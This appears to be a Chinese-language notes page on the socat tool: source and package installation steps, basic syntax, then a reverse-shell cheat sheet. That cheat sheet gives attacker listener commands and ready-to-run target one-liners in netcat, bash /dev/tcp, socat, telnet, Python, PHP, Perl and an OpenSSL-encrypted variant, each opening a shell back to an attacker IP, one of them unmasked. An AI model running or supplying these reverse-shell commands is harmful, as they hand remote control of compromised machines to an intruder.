https://www.hi-linux.com/posts/61543.html

Socat 的官方网站：http://www.dest-unreach.org/socat/

Socat 安装
通过源码方式安装
$ wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz
$ tar zxf socat-1.7.3.2.tar.gz
$ cd socat-1.7.3.2
$ ./configure 
$ make   
$ make install

通过包安装 (推荐)
Centos

$ yum install -y socat


Debian/Ubuntu

$ apt-get install -y socat


macOS

$ brew install socat


Socat 基本语法

socat [options] <address> <address>


# 反弹shell
https://xz.aliyun.com/t/9488

攻击机开启本地监听：
socat TCP-LISTEN:2333 -
netcat -lvvp 2333

目标机主动连接攻击机：
nc:     netcat 47.xxx.xxx.72 2333 -e /bin/bash
bash:   bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 或 bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"
socat： socat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane
telnet: mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a
python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
php:    php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
perl:   perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

openssl加密shell:
openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 > /tmp/s; rm /tmp/s
